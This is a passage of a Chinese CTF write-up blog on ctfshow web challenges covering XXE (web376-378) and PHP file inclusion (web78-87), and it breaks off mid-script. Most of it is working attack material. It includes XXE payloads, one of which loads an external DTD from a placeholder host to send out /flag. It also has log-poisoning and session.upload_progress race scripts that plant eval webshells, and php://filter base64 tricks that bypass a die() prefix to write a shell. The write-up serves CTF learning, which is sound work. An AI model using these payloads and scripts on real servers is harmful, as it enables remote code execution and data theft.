<h2 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/&lt;\?xml version="1\.0"/i'</span>, $xmlfile))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($xmlfile))&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>就是把头声明函数的大小写形式都禁了，继续上把payload</p>
</blockquote>
<h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/&lt;\?xml version="1\.0"|http/i'</span>, $xmlfile))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($xmlfile))&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>过滤了http，这里利用utf-16编码绕过</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/19</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://cc69366f-f9e6-4a07-aac3-e4694d53b4e5.challenge.ctf.show:8080/'</span></span><br><span class="line">payload = <span class="string">"""&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://www.xxx.com/html/xxe.xml"&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;"""</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">'utf-16'</span>)</span><br><span class="line">res = requests.post(url ,data=payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>一个登陆框，发现返回值是xml形式</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819192138583.png" alt="image-20210819192138583"></p>
</blockquote>
<p>直接内部实体注入payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;</span><br><span class="line">&amp;file;&lt;&#x2F;username&gt;&lt;password&gt;&amp;file;&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819192234216.png" alt="image-20210819192234216"></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-文件包含 wp</title>
    <url>/posts/98.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>开始文件包含的题型，无过滤</p>
<blockquote>
<p><strong>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</strong></p>
<p><strong>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</strong></p>
<p><strong>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</strong></p>
</blockquote>
<p><strong>payload如下</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure></div>

<p>在base64解码</p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><blockquote>
<p>这次多了个替换，将php替换成???，但是不碍事，用data伪协议</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system('tac flag.?hp');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><blockquote>
<p>这题换input伪协议，他的php可以换成大小写混用</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php echo &#96;ls&#96;?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815210900858.png" alt="image-20210815210900858"></p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这次把协议都禁了，我看到他是nginx的容器，直接包含日志拿shell</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log&amp;<span class="number">1</span>=<span class="keyword">echo</span> `tac fl0g.php`;</span><br><span class="line"></span><br><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815211531674.png" alt="image-20210815211531674"></p>
</blockquote>
<p><strong>写个exp</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/15</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://78c93547-1796-472d-b2e0-fe2f5e8413a5.challenge.ctf.show:8080/"</span>+<span class="string">"?file=/var/log/nginx/access.log"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'&lt;?php eval($_REQUEST[1]);?&gt;'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'1'</span>:<span class="string">'system("cat fl0g.php");'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers)</span><br><span class="line">result = requests.get(url=url, params=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815213059198.png" alt="image-20210815213059198"></p>
</blockquote>
<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先我们需要了解一些基础知识</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
<p><code>prefix+name</code>将表示为session中的键名</p>
</blockquote>
<p>由于上传进度可通过PHP_SESSION_UPLOAD_PROGRESS来控制，所以就意味着可以控制存储在session当中的内容</p>
<blockquote>
<p><strong>利用session.upload_progress进行文件包含利用</strong></p>
</blockquote>
<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>问题一</strong></p>
<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>
<p><strong>解答一</strong></p>
<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置<strong>PHPSESSID=TGAO</strong>，PHP将会在服务器上创建一个文件：<strong>/tmp/sess_TGAO</strong>”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
<p><strong>问题二</strong></p>
<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
<p><strong>如何进行rce呢？</strong></p>
<p><strong>解答二</strong></p>
<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
<p><strong>写个py跑脚本</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/16</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://88e0abdd-53f8-4706-9b44-9b8810b5697c.challenge.ctf.show:8080/'</span></span><br><span class="line">sessionid = <span class="string">"gylq"</span></span><br><span class="line">payload = <span class="string">"&lt;?php file_put_contents('shell.php','&lt;?php eval($_REQUEST[1]);?&gt;');?&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        url_include=url+<span class="string">'?file=/tmp/sess_'</span>+sessionid</span><br><span class="line">        res = requests.post(url_include)</span><br><span class="line">        <span class="keyword">if</span> sessionid <span class="keyword">in</span> res.text:</span><br><span class="line">            print(session.post(url+<span class="string">"shell.php?1=system('cat f*.*');"</span>).text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retry'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload+sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>: sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">'file'</span>: (<span class="string">'gylq.txt'</span>,io.BytesIO(<span class="string">b'success'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = session.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816140059172.png" alt="image-20210816140059172"></p>
</blockquote>
<h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><blockquote>
<p>多了session销毁，但是不影响，继续上一个脚本撸</p>
</blockquote>
<h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><blockquote>
<p>多了个删除rm -rf /tmp/*，但是不影响</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/16</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ace68431-996e-4147-a9c7-f59ffd12d3c8.challenge.ctf.show:8080/'</span></span><br><span class="line">sessionid = <span class="string">"gylq"</span></span><br><span class="line">payload = <span class="string">"&lt;?php file_put_contents('shell.php','&lt;?php eval($_REQUEST[1]);?&gt;');?&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url_include=url+<span class="string">'?file=/tmp/sess_'</span>+sessionid</span><br><span class="line">        res = requests.post(url_include)</span><br><span class="line">        <span class="keyword">if</span> sessionid <span class="keyword">in</span> res.text:</span><br><span class="line">            print(session.post(url+<span class="string">"shell.php?1=system('cat f*.*');"</span>).text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retry'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload+sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>: sessionid</span><br><span class="line">        &#125;</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">'file'</span>: (<span class="string">'gylq.txt'</span>,io.BytesIO(<span class="string">b'success'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = session.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30是比较快的，关线程也很慢，所以建议为1一样可行，如果一直未出结果，可以调高线程</span></span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></div>

<h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><blockquote>
<p><strong>这次加了个判断/tmp/sess_gylq中是否包含&lt;否则就报错，但是我们线程足够高，条件竞争可以强行绕过，继续跑</strong></p>
</blockquote>
<h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><blockquote>
<p><strong>继续上个脚本跑</strong></p>
</blockquote>
<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('大佬别秀了');?&gt;"</span>.$content);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这题换成了file_put_contents了</p>
<p>我们来了解一些基础知识</p>
</blockquote>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<p><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816191640247.png" alt="image-20210816191640247"></p>
</blockquote>
<p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">$content =$_POST[<span class="string">'content'</span>];</span><br><span class="line">file_put_contents(urldecode($filename),<span class="string">"&lt;?php die();"</span>.$content);</span><br></pre></td></tr></table></figure></div>

<p><strong>分析了下，<code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</strong></p>
<p>幸运的是，这里<code>$filename</code>是可以控制协议的，我们可以使用php://filter协议来解决这个问题使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
<p>一个正常的base64_decode可以理解为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br></pre></td></tr></table></figure></div>

<p>所以，当$content被加上了<code>&lt;?php exit;?&gt;</code>，我们就可以使用<code>php://filter/write=convert.base64-decode</code>对其解码，在解码的过程中字符&lt;、?、;、&gt;、空格等字符不符合base64编码的字符范围将被忽略，所以最终字符仅有”phpdie”六个字符</p>
<p>“phpdie”一共六个字符因为base64算法解码时是4个byte一组，所以给他增加2个‘a’一共8个字符，这样，“phpdieaa”才能被正常解码，则后面我们传入的webshell的base64编码内容也能被正常解码</p>
<p>GET传入<code>?filename=php://filter/convert.base64-decode/resource=simple.php</code></p>
<p>再post传入<code>content=aaPHBocCBldmFsKCRfUkVRVUVTVFsxXSk7Pz4=</code></p>
<p>生成如下图所示</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816192627808.png" alt="image-20210816192627808"></p>
</blockquote>
<p>由于这题源码过滤了php,但是他又写了个urldecode,所以我们可以通过双重url解密来bypass</p>
<p>这回我们写一个shell.php</p>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php（要两次url编码）</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pPz4&#x3D;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816193031047.png" alt="image-20210816193031047"></p>
</blockquote>
<p>这样就可以绕过执行webshell了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816193058121.png" alt="image-20210816193058121"></p>
</blockquote>
<p>了解原理了，也知道如何手工，再写个exp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/16</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://f2944b00-e1d4-4739-b83d-55854d7d3714.challenge.ctf.show:8080/'</span></span><br><span class="line"></span><br><span class="line">url_encode=<span class="string">'%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2573%2568%2565%256c%256c%252e%2570%2568%2570'</span></span><br><span class="line"></span><br><span class="line">get_url = url + <span class="string">'?file='</span> + url_encode</span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">'content'</span>:<span class="string">'aaPD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(get_url,data=data)</span><br><span class="line"></span><br><span class="line">cmd_url = url+<span class="string">'shell.php'</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">'cmd'</span>:<span class="string">'system("cat fl0g.php");'</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(cmd_url,data=data)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">    print(<span class="string">"[*]getshell in shell.php"</span>)</span><br><span class="line">    